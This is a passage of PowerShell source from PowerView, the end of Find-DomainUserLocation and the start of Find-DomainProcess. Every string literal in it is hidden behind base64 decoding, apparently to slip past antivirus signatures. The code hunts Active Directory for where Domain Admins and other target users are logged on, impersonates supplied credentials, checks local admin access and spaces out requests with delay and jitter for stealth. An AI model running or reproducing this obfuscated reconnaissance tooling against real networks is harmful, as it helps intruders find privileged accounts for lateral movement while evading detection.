        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlclNlYXJjaEJhc2U=")))]) { $UserSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))] = $UserSearchBase }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlckFkbWluQ291bnQ=")))]) { $UserSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWRtaW5Db3VudA==")))] = $UserAdminCount }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlckFsbG93RGVsZWdhdGlvbg==")))]) { $UserSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWxsb3dEZWxlZ2F0aW9u")))] = $UserAllowDelegation }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $UserSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))]) { $UserSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))] = $SearchScope }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))]) { $UserSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))] = $ResultPageSize }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))]) { $UserSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))] = $ServerTimeLimit }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))]) { $UserSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))] = $Tombstone }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $UserSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }

        $TargetComputers = @()

        
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJOYW1l")))]) {
            $TargetComputers = @($ComputerName)
        }
        else {
            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3RlYWx0aA==")))]) {
                Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtRG9tYWluVXNlckxvY2F0aW9uXSBTdGVhbHRoIGVudW1lcmF0aW9uIHVzaW5nIHNvdXJjZTogJFN0ZWFsdGhTb3VyY2U=")))
                $TargetComputerArrayList = New-Object System.Collections.ArrayList

                if ($StealthSource -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RmlsZXxBbGw=")))) {
                    Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtRG9tYWluVXNlckxvY2F0aW9uXSBRdWVyeWluZyBmb3IgZmlsZSBzZXJ2ZXJz")))
                    $FileServerSearcherArguments = @{}
                    if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) { $FileServerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $Domain }
                    if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJEb21haW4=")))]) { $FileServerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $ComputerDomain }
                    if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJTZWFyY2hCYXNl")))]) { $FileServerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))] = $ComputerSearchBase }
                    if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $FileServerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
                    if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))]) { $FileServerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))] = $SearchScope }
                    if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))]) { $FileServerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))] = $ResultPageSize }
                    if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))]) { $FileServerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))] = $ServerTimeLimit }
                    if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))]) { $FileServerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))] = $Tombstone }
                    if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $FileServerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
                    $FileServers = Get-DomainFileServer @FileServerSearcherArguments
                    if ($FileServers -isnot [System.Array]) { $FileServers = @($FileServers) }
                    $TargetComputerArrayList.AddRange( $FileServers )
                }
                if ($StealthSource -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REZTfEFsbA==")))) {
                    Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtRG9tYWluVXNlckxvY2F0aW9uXSBRdWVyeWluZyBmb3IgREZTIHNlcnZlcnM=")))
                    
                    
                }
                if ($StealthSource -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REN8QWxs")))) {
                    Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtRG9tYWluVXNlckxvY2F0aW9uXSBRdWVyeWluZyBmb3IgZG9tYWluIGNvbnRyb2xsZXJz")))
                    $DCSearcherArguments = @{
                        ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUA=="))) = $True
                    }
                    if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) { $DCSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $Domain }
                    if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJEb21haW4=")))]) { $DCSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $ComputerDomain }
                    if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $DCSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
                    if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $DCSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
                    $DomainControllers = Get-DomainController @DCSearcherArguments | Select-Object -ExpandProperty dnshostname
                    if ($DomainControllers -isnot [System.Array]) { $DomainControllers = @($DomainControllers) }
                    $TargetComputerArrayList.AddRange( $DomainControllers )
                }
                $TargetComputers = $TargetComputerArrayList.ToArray()
            }
            else {
                Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtRG9tYWluVXNlckxvY2F0aW9uXSBRdWVyeWluZyBmb3IgYWxsIGNvbXB1dGVycyBpbiB0aGUgZG9tYWlu")))
                $TargetComputers = Get-DomainComputer @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
            }
        }
        Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtRG9tYWluVXNlckxvY2F0aW9uXSBUYXJnZXRDb21wdXRlcnMgbGVuZ3RoOiB7MH0="))) -f $($TargetComputers.Length))
        if ($TargetComputers.Length -eq 0) {
            throw ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtRG9tYWluVXNlckxvY2F0aW9uXSBObyBob3N0cyBmb3VuZCB0byBlbnVtZXJhdGU=")))
        }

        
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) {
            $CurrentUser = $Credential.GetNetworkCredential().UserName
        }
        else {
            $CurrentUser = ([Environment]::UserName).ToLower()
        }

        
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2hvd0FsbA==")))]) {
            $TargetUsers = @()
        }
        elseif ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlcklkZW50aXR5")))] -or $PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlckxEQVBGaWx0ZXI=")))] -or $PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlclNlYXJjaEJhc2U=")))] -or $PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlckFkbWluQ291bnQ=")))] -or $PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlckFsbG93RGVsZWdhdGlvbg==")))]) {
            $TargetUsers = Get-DomainUser @UserSearcherArguments | Select-Object -ExpandProperty samaccountname
        }
        else {
            $GroupSearcherArguments = @{
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SWRlbnRpdHk="))) = $UserGroupIdentity
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVjdXJzZQ=="))) = $True
            }
            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlckRvbWFpbg==")))]) { $GroupSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $UserDomain }
            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlclNlYXJjaEJhc2U=")))]) { $GroupSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))] = $UserSearchBase }
            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $GroupSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))]) { $GroupSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))] = $SearchScope }
            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))]) { $GroupSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))] = $ResultPageSize }
            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))]) { $GroupSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))] = $ServerTimeLimit }
            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))]) { $GroupSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))] = $Tombstone }
            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $GroupSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
            $TargetUsers = Get-DomainGroupMember @GroupSearcherArguments | Select-Object -ExpandProperty MemberName
        }

        Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtRG9tYWluVXNlckxvY2F0aW9uXSBUYXJnZXRVc2VycyBsZW5ndGg6IHswfQ=="))) -f $($TargetUsers.Length))
        if ((-not $ShowAll) -and ($TargetUsers.Length -eq 0)) {
            throw ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtRG9tYWluVXNlckxvY2F0aW9uXSBObyB1c2VycyBmb3VuZCB0byB0YXJnZXQ=")))
        }

        
        $HostEnumBlock = {
            Param($ComputerName, $TargetUsers, $CurrentUser, $Stealth, $TokenHandle)

            if ($TokenHandle) {
                
                $Null = Invoke-UserImpersonation -TokenHandle $TokenHandle -Quiet
            }

            ForEach ($TargetComputer in $ComputerName) {
                $Up = Test-Connection -Count 1 -Quiet -ComputerName $TargetComputer
                if ($Up) {
                    $Sessions = Get-NetSession -ComputerName $TargetComputer
                    ForEach ($Session in $Sessions) {
                        $UserName = $Session.UserName
                        $CName = $Session.CName

                        if ($CName -and $CName.StartsWith(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XFw="))))) {
                            $CName = $CName.TrimStart(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XA=="))))
                        }

                        
                        if (($UserName) -and ($UserName.Trim() -ne '') -and ($UserName -notmatch $CurrentUser) -and ($UserName -notmatch ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XCQk"))))) {

                            if ( (-not $TargetUsers) -or ($TargetUsers -contains $UserName)) {
                                $UserLocation = New-Object PSObject
                                $UserLocation | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlckRvbWFpbg=="))) $Null
                                $UserLocation | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlck5hbWU="))) $UserName
                                $UserLocation | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJOYW1l"))) $TargetComputer
                                $UserLocation | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2Vzc2lvbkZyb20="))) $CName

                                
                                try {
                                    $CNameDNSName = [System.Net.Dns]::GetHostEntry($CName) | Select-Object -ExpandProperty HostName
                                    $UserLocation | Add-Member NoteProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2Vzc2lvbkZyb21OYW1l"))) $CnameDNSName
                                }
                                catch {
                                    $UserLocation | Add-Member NoteProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2Vzc2lvbkZyb21OYW1l"))) $Null
                                }

                                
                                if ($CheckAccess) {
                                    $Admin = (Test-AdminAccess -ComputerName $CName).IsAdmin
                                    $UserLocation | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TG9jYWxBZG1pbg=="))) $Admin.IsAdmin
                                }
                                else {
                                    $UserLocation | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TG9jYWxBZG1pbg=="))) $Null
                                }
                                $UserLocation.PSObject.TypeNames.Insert(0, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3LlVzZXJMb2NhdGlvbg=="))))
                                $UserLocation
                            }
                        }
                    }
                    if (-not $Stealth) {
                        
                        $LoggedOn = Get-NetLoggedon -ComputerName $TargetComputer
                        ForEach ($User in $LoggedOn) {
                            $UserName = $User.UserName
                            $UserDomain = $User.LogonDomain

                            
                            if (($UserName) -and ($UserName.trim() -ne '')) {
                                if ( (-not $TargetUsers) -or ($TargetUsers -contains $UserName) -and ($UserName -notmatch ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XCQk"))))) {
                                    $IPAddress = @(Resolve-IPAddress -ComputerName $TargetComputer)[0].IPAddress
                                    $UserLocation = New-Object PSObject
                                    $UserLocation | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlckRvbWFpbg=="))) $UserDomain
                                    $UserLocation | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlck5hbWU="))) $UserName
                                    $UserLocation | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJOYW1l"))) $TargetComputer
                                    $UserLocation | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SVBBZGRyZXNz"))) $IPAddress
                                    $UserLocation | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2Vzc2lvbkZyb20="))) $Null
                                    $UserLocation | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2Vzc2lvbkZyb21OYW1l"))) $Null

                                    
                                    if ($CheckAccess) {
                                        $Admin = Test-AdminAccess -ComputerName $TargetComputer
                                        $UserLocation | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TG9jYWxBZG1pbg=="))) $Admin.IsAdmin
                                    }
                                    else {
                                        $UserLocation | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TG9jYWxBZG1pbg=="))) $Null
                                    }
                                    $UserLocation.PSObject.TypeNames.Insert(0, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3LlVzZXJMb2NhdGlvbg=="))))
                                    $UserLocation
                                }
                            }
                        }
                    }
                }
            }

            if ($TokenHandle) {
                Invoke-RevertToSelf
            }
        }

        $LogonToken = $Null
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) {
            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RGVsYXk=")))] -or $PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3RvcE9uU3VjY2Vzcw==")))]) {
                $LogonToken = Invoke-UserImpersonation -Credential $Credential
            }
            else {
                $LogonToken = Invoke-UserImpersonation -Credential $Credential -Quiet
            }
        }
    }

    PROCESS {
        
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RGVsYXk=")))] -or $PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3RvcE9uU3VjY2Vzcw==")))]) {

            Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtRG9tYWluVXNlckxvY2F0aW9uXSBUb3RhbCBudW1iZXIgb2YgaG9zdHM6IHswfQ=="))) -f $($TargetComputers.count))
            Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtRG9tYWluVXNlckxvY2F0aW9uXSBEZWxheTogJERlbGF5LCBKaXR0ZXI6ICRKaXR0ZXI=")))
            $Counter = 0
            $RandNo = New-Object System.Random

            ForEach ($TargetComputer in $TargetComputers) {
                $Counter = $Counter + 1

                
                Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)

                Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtRG9tYWluVXNlckxvY2F0aW9uXSBFbnVtZXJhdGluZyBzZXJ2ZXIgJENvbXB1dGVyICgkQ291bnRlciBvZiB7MH0p"))) -f $($TargetComputers.Count))
                Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $TargetComputer, $TargetUsers, $CurrentUser, $Stealth, $LogonToken

                if ($Result -and $StopOnSuccess) {
                    Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtRG9tYWluVXNlckxvY2F0aW9uXSBUYXJnZXQgdXNlciBmb3VuZCwgcmV0dXJuaW5nIGVhcmx5")))
                    return
                }
            }
        }
        else {
            Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtRG9tYWluVXNlckxvY2F0aW9uXSBVc2luZyB0aHJlYWRpbmcgd2l0aCB0aHJlYWRzOiAkVGhyZWFkcw==")))
            Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtRG9tYWluVXNlckxvY2F0aW9uXSBUYXJnZXRDb21wdXRlcnMgbGVuZ3RoOiB7MH0="))) -f $($TargetComputers.Length))

            
            $ScriptParams = @{
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VGFyZ2V0VXNlcnM="))) = $TargetUsers
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3VycmVudFVzZXI="))) = $CurrentUser
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3RlYWx0aA=="))) = $Stealth
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9rZW5IYW5kbGU="))) = $LogonToken
            }

            
            New-ThreadedFunction -ComputerName $TargetComputers -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads
        }
    }

    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}


function Find-DomainProcess {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUsePSCredentialType', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPlainTextForPassword', '')]
    [OutputType('PowerView.UserProcess')]
    [CmdletBinding(DefaultParameterSetName = 'None')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        $ComputerName,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerDomain,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerLDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerSearchBase,

        [Alias('Unconstrained')]
        [Switch]
        $ComputerUnconstrained,

        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $ComputerOperatingSystem,

        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $ComputerServicePack,

        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $ComputerSiteName,

        [Parameter(ParameterSetName = 'TargetProcess')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ProcessName,

        [Parameter(ParameterSetName = 'TargetUser')]
        [Parameter(ParameterSetName = 'UserIdentity')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $UserIdentity,

        [Parameter(ParameterSetName = 'TargetUser')]
        [ValidateNotNullOrEmpty()]
        [String]
        $UserDomain,

        [Parameter(ParameterSetName = 'TargetUser')]
        [ValidateNotNullOrEmpty()]
        [String]
        $UserLDAPFilter,

        [Parameter(ParameterSetName = 'TargetUser')]
        [ValidateNotNullOrEmpty()]
        [String]
        $UserSearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('GroupName', 'Group')]
        [String[]]
        $UserGroupIdentity = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWluIEFkbWlucw=="))),

        [Parameter(ParameterSetName = 'TargetUser')]
        [Alias('AdminCount')]
        [Switch]
        $UserAdminCount,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3VidHJlZQ=="))),

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $StopOnSuccess,

        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        $Jitter = .3,

        [Int]
        [ValidateRange(1, 100)]
        $Threads = 20
    )

    BEGIN {
        $ComputerSearcherArguments = @{
            'Properties' = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZG5zaG9zdG5hbWU=")))
        }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $Domain }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJEb21haW4=")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $ComputerDomain }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJMREFQRmlsdGVy")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUEZpbHRlcg==")))] = $ComputerLDAPFilter }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJTZWFyY2hCYXNl")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))] = $ComputerSearchBase }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VW5jb25zdHJhaW5lZA==")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VW5jb25zdHJhaW5lZA==")))] = $Unconstrained }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJPcGVyYXRpbmdTeXN0ZW0=")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T3BlcmF0aW5nU3lzdGVt")))] = $OperatingSystem }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJTZXJ2aWNlUGFjaw==")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmljZVBhY2s=")))] = $ServicePack }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJTaXRlTmFtZQ==")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2l0ZU5hbWU=")))] = $SiteName }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))] = $SearchScope }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))] = $ResultPageSize }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))] = $ServerTimeLimit }
